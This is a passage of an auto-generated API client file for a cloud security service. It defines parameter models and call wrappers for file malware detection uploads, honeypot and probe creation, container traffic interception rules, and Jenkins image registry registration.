  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CreateFileDetectResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileDetectResponseBody(name='body'),
}

/**
  * The identifier of the file. Only MD5 hash values are supported.
  *
  * @param request CreateFileDetectRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateFileDetectResponse
 */
async function createFileDetectWithOptions(request: CreateFileDetectRequest, runtime: Util.RuntimeOptions): CreateFileDetectResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKey)) {
    query['HashKey'] = request.hashKey;
  }
  if (!Util.isUnset(request.ossKey)) {
    query['OssKey'] = request.ossKey;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileDetect',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * The identifier of the file. Only MD5 hash values are supported.
  *
  * @param request CreateFileDetectRequest
  * @return CreateFileDetectResponse
 */
async function createFileDetect(request: CreateFileDetectRequest): CreateFileDetectResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileDetectWithOptions(request, runtime);
}

model CreateFileDetectUploadUrlRequest {
  hashKeyContextList?: [ 
    {
      fileSize?: int32(name='FileSize', description='The size of the file. Unit: bytes.', example='2698557'),
      hashKey?: string(name='HashKey', description='The hash value of the file.', example='30319dd5cee8f894766e479cac170da0'),
    }
  ](name='HashKeyContextList', description='The hash values of files.

> You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.'),
  hashKeyList?: [ string ](name='HashKeyList', description='The identifiers of files. Only MD5 hash values are supported.

> You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.', example='CreateFileDetectUploadUrl'),
  type?: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown file
*   **1**: binary file
*   **2**: webshell file
*   **4**: script file

> If you do not know the type of the file, set this parameter to **0**.', example='0'),
}

model CreateFileDetectUploadUrlResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  uploadUrlList?: [ 
    {
      code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
      context?: {
        accessId?: string(name='AccessId', description='The AccessKey ID that is used to access the OSS bucket.', example='LTAI4G1mgPbjvGQuiV1X****'),
        ossKey?: string(name='OssKey', description='The key of the file that is used after the file is uploaded to the OSS bucket.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
        policy?: string(name='Policy', description='The policy that poses limits on file upload. For example, the policy can limit the size of the file.', example='eyJleHBpcmF0aW9uIjoiMjAyMi0wNy0yM1QxMDo1ODoxMC43NTNaIiwiY29uZGl0aW9ucyI6W1siY29udGVudC1sZW5ndGgtcmFuZ2UiLDAsMjA5NzE1MjBdLFsiZXEiLCIka2V5IiwiMS8yMDIyLzA2LzIzLzE4LzU4LzE2NTU5ODE4OTA3NTM4NTc2MjFkNS1kN2E1LTQ5YzAtOGJjZi0yMTMyY2JiYTdmYzMi****'),
        signature?: string(name='Signature', description='The signature that is used to upload the file.', example='wDhPgVdnY/bkKFYcYFl+4crl****'),
      }(name='Context', description='The signature information.'),
      expire?: string(name='Expire', description='The timestamp when the values of the parameters expire. Unit: milliseconds.', example='1658562101370'),
      fileExist?: boolean(name='FileExist', description='Indicates whether the file exists in the cloud. Valid values:

*   **true**: The file exists in the cloud. You do not need to upload the file.
*   **false**: The file does not exist in the cloud. You must upload the file.', example='false'),
      hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
      internalUrl?: string(name='InternalUrl', description='The internal endpoint of the URL to which the file is uploaded.', example='http://example.com'),
      message?: string(name='Message', description='The error message returned.', example='successful'),
      publicUrl?: string(name='PublicUrl', description='The public endpoint of the URL to which the file is uploaded.', example='http://example.com'),
    }
  ](name='UploadUrlList', description='An array consisting of the parameters that are required to upload a file.'),
}

model CreateFileDetectUploadUrlResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileDetectUploadUrlResponseBody(name='body'),
}

/**
  * You can call this operation to query the parameters that are required to upload a file for detection. If the value of the response parameter FileExist is true, the file that you want to upload for detection already exists in the cloud. In this case, you can directly push the file for detection. If the value of the response parameter FileExist is false, you must use the form upload method to upload the file to the specified Object Storage Service (OSS) bucket based on the response parameters of this operation.
  * The form upload method is provided by OSS. For more information, see [Form upload](~~84788~~).
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectUploadUrlRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateFileDetectUploadUrlResponse
 */
async function createFileDetectUploadUrlWithOptions(request: CreateFileDetectUploadUrlRequest, runtime: Util.RuntimeOptions): CreateFileDetectUploadUrlResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKeyContextList)) {
    query['HashKeyContextList'] = request.hashKeyContextList;
  }
  if (!Util.isUnset(request.hashKeyList)) {
    query['HashKeyList'] = request.hashKeyList;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileDetectUploadUrl',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call this operation to query the parameters that are required to upload a file for detection. If the value of the response parameter FileExist is true, the file that you want to upload for detection already exists in the cloud. In this case, you can directly push the file for detection. If the value of the response parameter FileExist is false, you must use the form upload method to upload the file to the specified Object Storage Service (OSS) bucket based on the response parameters of this operation.
  * The form upload method is provided by OSS. For more information, see [Form upload](~~84788~~).
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectUploadUrlRequest
  * @return CreateFileDetectUploadUrlResponse
 */
async function createFileDetectUploadUrl(request: CreateFileDetectUploadUrlRequest): CreateFileDetectUploadUrlResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileDetectUploadUrlWithOptions(request, runtime);
}

model CreateHoneypotRequest {
  honeypotImageId?: string(name='HoneypotImageId', description='The ID of the honeypot image.

> You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to query the IDs of images from the **HoneypotImageId** response parameter.', example='sha256:ebc4c102ac407d53733c2373e8888a733ddce86f163ccbe7492ae1cbf26****'),
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.

> You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to query the names of images from the **HoneypotImageName** response parameter.', example='HoneyPotImageName'),
  honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
  meta?: string(name='Meta', description='The custom configuration of the honeypot in the JSON format. The value contains the following fields:

*   **trojan_git**: Git-specific Defense. Valid values:

    *   **zip**: Git Source Code Package
    *   **web**: Git Directory Leak
    *   **close**: Disabled

*   **trojan_git_addr**: Git Trojan Address.

*   **trojan_git.zip**: Git Trojan.

*   **burp**: Burp-specific Defense. Valid values:

    *   **open**: Enable
    *   **close**: Disable

*   **portrait_option**: Source Tracing Configuration. Valid values:

    *   **false**: Disable
    *   **true**: Enable', example='{\\"trojan_git\\":\\"close\\",\\"burp\\":\\"close\\",\\"portrait_option\\":\\"false\\"}'),
  nodeId?: string(name='NodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
}

model CreateHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='managerNodename'),
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='HoneyDisplayName'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='tcp_proxy'),
    honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='ddh3731641137fe4b72b245346a2721d4b6tdgg3731641137fe4b72b245346a2721***'),
    state?: [ string ](name='State', description='An array that consists of the status information about the honeypot.'),
  }(name='Data', description='The information about the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='29874225-EAAC-5415-8501-32DD20FD29F6'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotResponseBody(name='body'),
}

async function createHoneypotWithOptions(request: CreateHoneypotRequest, runtime: Util.RuntimeOptions): CreateHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageId)) {
    query['HoneypotImageId'] = request.honeypotImageId;
  }
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypot(request: CreateHoneypotRequest): CreateHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotWithOptions(request, runtime);
}

model CreateHoneypotNodeRequest {
  allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Specifies whether to allow honeypots to access the Internet. Valid values:

*   **true**: allows honeypots to access the Internet.
*   **false**: does not allow honeypots to access the Internet.', example='true'),
  availableProbeNum?: int32(name='AvailableProbeNum', description='The number of available probes.', example='20'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='manageNode'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='The CIDR blocks that are allowed to access the management node.'),
}

model CreateHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNode?: {
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='37a15ff1-3475-4897-aa6c-f7fd9122****'),
  }(name='HoneypotNode', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotNodeResponseBody(name='body'),
}

async function createHoneypotNodeWithOptions(request: CreateHoneypotNodeRequest, runtime: Util.RuntimeOptions): CreateHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.allowHoneypotAccessInternet)) {
    query['AllowHoneypotAccessInternet'] = request.allowHoneypotAccessInternet;
  }
  if (!Util.isUnset(request.availableProbeNum)) {
    query['AvailableProbeNum'] = request.availableProbeNum;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.securityGroupProbeIpList)) {
    query['SecurityGroupProbeIpList'] = request.securityGroupProbeIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypotNode(request: CreateHoneypotNodeRequest): CreateHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotNodeWithOptions(request, runtime);
}

model CreateHoneypotPresetRequest {
  honeypotImageName?: string(name='HoneypotImageName', example='webmin'),
  lang?: string(name='Lang', example='zh'),
  meta?: string(name='Meta', example='{"burp":"close","trojan_git":"close","portrait_option":"true"}'),
  nodeId?: string(name='NodeId', example='9373fe59-74d5-4505-bb24-c85352fb****'),
  presetName?: string(name='PresetName', example='WebMin-online'),
}

model CreateHoneypotPresetResponseBody = {
  code?: string(name='Code', example='200'),
  honeypotPreset?: {
    honeypotPresetId?: string(name='HoneypotPresetId', example='d6ece172-34d9-4942-99a4-b309cb55xxxx'),
  }(name='HoneypotPreset'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='7C1C6E65-C8B9-54C9-9F92-2F5E51C4E16D'),
  success?: boolean(name='Success', example='true'),
}

model CreateHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotPresetResponseBody(name='body'),
}

async function createHoneypotPresetWithOptions(request: CreateHoneypotPresetRequest, runtime: Util.RuntimeOptions): CreateHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypotPreset(request: CreateHoneypotPresetRequest): CreateHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotPresetWithOptions(request, runtime);
}

model CreateHoneypotProbeRequest {
  arp?: boolean(name='Arp', example='true'),
  businessGroupId?: string(name='BusinessGroupId', example='2022011817324588686'),
  controlNodeId?: string(name='ControlNodeId', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
  displayName?: string(name='DisplayName', example='testHoneyPotProbe'),
  honeypotBindList?: [ 
    {
      bindPortList?: [ 
        {
          bindPort?: boolean(name='BindPort', example='true'),
          endPort?: int32(name='EndPort', example='90'),
          fixed?: boolean(name='Fixed', example='0'),
          startPort?: int32(name='StartPort', example='80'),
          targetPort?: int32(name='TargetPort', example='80'),
        }
      ](name='BindPortList'),
      honeypotId?: string(name='HoneypotId', example='1a5eda2d40f92ac87d6b63e1a5ad4b76fe0d4110c4a3e2fa85438a29ae55****'),
    }
  ](name='HoneypotBindList'),
  ping?: boolean(name='Ping', example='true'),
  probeType?: string(name='ProbeType', example='host_probe'),
  probeVersion?: string(name='ProbeVersion', example='0.0.0'),
  proxyIp?: string(name='ProxyIp', example='192.168.XX.XX'),
  uuid?: string(name='Uuid', example='e4af3620-6895-4e2f-a641-a9d8fb53****'),
  vpcId?: string(name='VpcId', example='vpc-zm0asrkpv1q8gnk7mn4dn'),
}

model CreateHoneypotProbeResponseBody = {
  code?: string(name='Code', example='200'),
  honeypotProbe?: {
    probeId?: string(name='ProbeId', example='b69e9aa8-2ea8-4c5a-836a-c1fbacff****'),
  }(name='HoneypotProbe'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='B7A839E8-70AE-591D-8D9E-C5419A2240DB'),
  success?: boolean(name='Success', example='true'),
}

model CreateHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotProbeResponseBody(name='body'),
}

async function createHoneypotProbeWithOptions(request: CreateHoneypotProbeRequest, runtime: Util.RuntimeOptions): CreateHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.arp)) {
    query['Arp'] = request.arp;
  }
  if (!Util.isUnset(request.businessGroupId)) {
    query['BusinessGroupId'] = request.businessGroupId;
  }
  if (!Util.isUnset(request.controlNodeId)) {
    query['ControlNodeId'] = request.controlNodeId;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.honeypotBindList)) {
    query['HoneypotBindList'] = request.honeypotBindList;
  }
  if (!Util.isUnset(request.ping)) {
    query['Ping'] = request.ping;
  }
  if (!Util.isUnset(request.probeType)) {
    query['ProbeType'] = request.probeType;
  }
  if (!Util.isUnset(request.probeVersion)) {
    query['ProbeVersion'] = request.probeVersion;
  }
  if (!Util.isUnset(request.proxyIp)) {
    query['ProxyIp'] = request.proxyIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypotProbe(request: CreateHoneypotProbeRequest): CreateHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotProbeWithOptions(request, runtime);
}

model CreateInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c35xxxa416'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='sas-test-cnnf'),
  dstTargetList?: map[string]any(name='DstTargetList', description='The information about the destination network object. The value of this parameter contains the following fields:

*   targetId: the ID of the destination network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.
*   ports: the destination port ranges.', example='[
      {
            "targetId": 600036,
            "ports": [
                  "1/65535"
            ]
      }
]'),
  interceptType?: long(name='InterceptType', description='The action on traffic. Valid values:

*   **1**: blocks traffic.
*   **2**: allows traffic and generates alerts.
*   **3**: allows traffic and does not generate alerts.', example='1'),
  orderIndex?: long(name='OrderIndex', description='The priority of the defense rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.', example='1'),
  ruleName?: string(name='RuleName', description='The name of the defense rule.', example='test-rule-1'),
  ruleSwitch?: int32(name='RuleSwitch', description='Specifies the status of the defense rule. Valid values:

*   **0**: disables the rule.
*   **1**: enables the rule.', example='0'),
  ruleType?: string(name='RuleType', description='The type of the defense rule. Valid values:

*   customize: custom rule', example='customize'),
  srcTarget?: map[string]any(name='SrcTarget', description='The source network object. The value of this parameter contains the following field:

*   targetId: the ID of the source network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.', example='{"targetId":301940}'),
}

model CreateInterceptionRuleShrinkRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c35xxxa416'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='sas-test-cnnf'),
  dstTargetListShrink?: string(name='DstTargetList', description='The information about the destination network object. The value of this parameter contains the following fields:

*   targetId: the ID of the destination network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.
*   ports: the destination port ranges.', example='[
      {
            "targetId": 600036,
            "ports": [
                  "1/65535"
            ]
      }
]'),
  interceptType?: long(name='InterceptType', description='The action on traffic. Valid values:

*   **1**: blocks traffic.
*   **2**: allows traffic and generates alerts.
*   **3**: allows traffic and does not generate alerts.', example='1'),
  orderIndex?: long(name='OrderIndex', description='The priority of the defense rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.', example='1'),
  ruleName?: string(name='RuleName', description='The name of the defense rule.', example='test-rule-1'),
  ruleSwitch?: int32(name='RuleSwitch', description='Specifies the status of the defense rule. Valid values:

*   **0**: disables the rule.
*   **1**: enables the rule.', example='0'),
  ruleType?: string(name='RuleType', description='The type of the defense rule. Valid values:

*   customize: custom rule', example='customize'),
  srcTargetShrink?: string(name='SrcTarget', description='The source network object. The value of this parameter contains the following field:

*   targetId: the ID of the source network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.', example='{"targetId":301940}'),
}

model CreateInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A01810A0-xxx5E2676'),
}

model CreateInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateInterceptionRuleResponseBody(name='body'),
}

async function createInterceptionRuleWithOptions(tmpReq: CreateInterceptionRuleRequest, runtime: Util.RuntimeOptions): CreateInterceptionRuleResponse {
  Util.validateModel(tmpReq);
  var request = new CreateInterceptionRuleShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstTargetList)) {
    request.dstTargetListShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstTargetList, 'DstTargetList', 'json');
  }
  if (!Util.isUnset(tmpReq.srcTarget)) {
    request.srcTargetShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcTarget, 'SrcTarget', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.dstTargetListShrink)) {
    query['DstTargetList'] = request.dstTargetListShrink;
  }
  if (!Util.isUnset(request.interceptType)) {
    query['InterceptType'] = request.interceptType;
  }
  if (!Util.isUnset(request.orderIndex)) {
    query['OrderIndex'] = request.orderIndex;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  if (!Util.isUnset(request.srcTargetShrink)) {
    query['SrcTarget'] = request.srcTargetShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createInterceptionRule(request: CreateInterceptionRuleRequest): CreateInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createInterceptionRuleWithOptions(request, runtime);
}

model CreateInterceptionTargetRequest {
  appName?: string(name='AppName', example='frontend'),
  clusterId?: string(name='ClusterId', example='cc20a1024011c44b6a8710d6f8b****'),
  clusterName?: string(name='ClusterName', example='sas-test-cnnf'),
  imageList?: [ string ](name='ImageList'),
  namespace?: string(name='Namespace', example='default'),
  tagList?: [ string ](name='TagList'),
  targetName?: string(name='TargetName'),
  targetType?: string(name='TargetType', example='IMAGE'),
}

model CreateInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', example='5B9ECCC0-38F7-***'),
  result?: boolean(name='Result', example='true'),
}

model CreateInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateInterceptionTargetResponseBody(name='body'),
}

async function createInterceptionTargetWithOptions(request: CreateInterceptionTargetRequest, runtime: Util.RuntimeOptions): CreateInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.imageList)) {
    query['ImageList'] = request.imageList;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createInterceptionTarget(request: CreateInterceptionTargetRequest): CreateInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return createInterceptionTargetWithOptions(request, runtime);
}

model CreateJenkinsImageRegistryRequest {
  domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
  extraParam?: string(name='ExtraParam', description='The additional parameters of the image repository. The value of this parameter contains the following fields:

*   **namespace**: the namespace
*   **authToken**: the authorization token', example='[{\\"namespace\\":\\"aa\\",\\"authToken\\":\\"aa\\"}]'),
  netType?: int32(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: Virtual Private Cloud (VPC)', example='1'),
  password?: string(name='Password', description='The password.', example='Harbor********'),
  persistenceDay?: int32(name='PersistenceDay', description='The number of days during which assets can be retained.', example='30'),
  protocolType?: int32(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='1'),
  regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-shanghai'),
  registryHostIp?: string(name='RegistryHostIp', description='The IP address of the image repository.', example='114.55.XXX.XXX'),
  registryName?: string(name='RegistryName', description='The alias of the image repository.', example='testRepo'),
  registryType?: string(name='RegistryType', description='The type of the image repository. Valid values:

*   **CI/CD**: Jenkins', example='CI/CD'),
  registryVersion?: string(name='RegistryVersion', description='The version of the image repository. Default value: -. Valid values:

*   **-**: the default version
*   **V1**: V1.0
*   **V2**: V2.0', example='V1'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='41.121.XXX.XXX'),
  transPerHour?: int32(name='TransPerHour', description='The number of images that can be scanned per hour.', example='30'),
  userName?: string(name='UserName', description='The username.', example='RegistryUser'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.', example='vpc-2ze4aoqgeu51ydfb8****'),
  whiteList?: string(name='WhiteList', description='The whitelist of IP addresses.', example='192.168.XXX.XXX'),
}

model CreateJenkinsImageRegistryResponseBody = {
  data?: {
    blackList?: string(name='BlackList', description='The blacklist.', example='61.9.XXX.XXX'),
    domainName?: string(name='DomainName', description='The domain name of the image repository.', example='example.com'),
    gmtCreate?: string(name='GmtCreate', description='The creation time. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-10-16 18:17:16'),
    gmtModified?: string(name='GmtModified', description='The update time. The time is in the yyyy-MM-dd HH:mm:ss format.', example='2022-11-21 10:40:01'),
    id?: long(name='Id', description='The ID of the image repository.', example='443496'),
    netType?: int32(name='NetType', description='The network type. Valid values:

*   **1**: Internet
*   **2**: VPC', example='1'),
    password?: string(name='Password', description='The password.', example='Harbor******'),
    persistenceDay?: int32(name='PersistenceDay', description='The number of days during which assets can be retained.', example='30'),
    protocolType?: int32(name='ProtocolType', description='The type of the protocol. Valid values:

*   **1**: HTTP
*   **2**: HTTPS', example='1'),
    regionId?: string(name='RegionId', description='The region ID of the image repository.', example='cn-shanghai'),
